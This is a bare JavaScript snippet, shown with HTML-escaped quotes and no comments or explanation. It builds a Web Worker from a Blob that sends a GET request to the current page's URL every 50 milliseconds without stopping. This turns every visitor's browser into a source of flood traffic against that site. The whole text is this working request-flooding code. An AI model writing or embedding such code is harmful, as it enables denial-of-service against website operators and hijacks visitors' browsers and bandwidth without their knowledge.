var targetURL = window.location;

window.URL = window.URL || window.webkitURL;

var code = &#34;setInterval( function() { var req = new XMLHttpRequest(); req.open(&#39;GET&#39;, &#39;&#34; + targetURL + &#34;&#39;, true); req.send(null); }, 50);&#34;;

var blob;
try {
    blob = new Blob([code], {type: &#39;application/javascript&#39;});
} catch (e) { 
    window.BlobBuilder = window.BlobBuilder || window.WebKitBlobBuilder || window.MozBlobBuilder;
    blob = new BlobBuilder();
    blob.append(code);
    blob = blob.getBlob();
}
var worker = new Worker(URL.createObjectURL(blob));

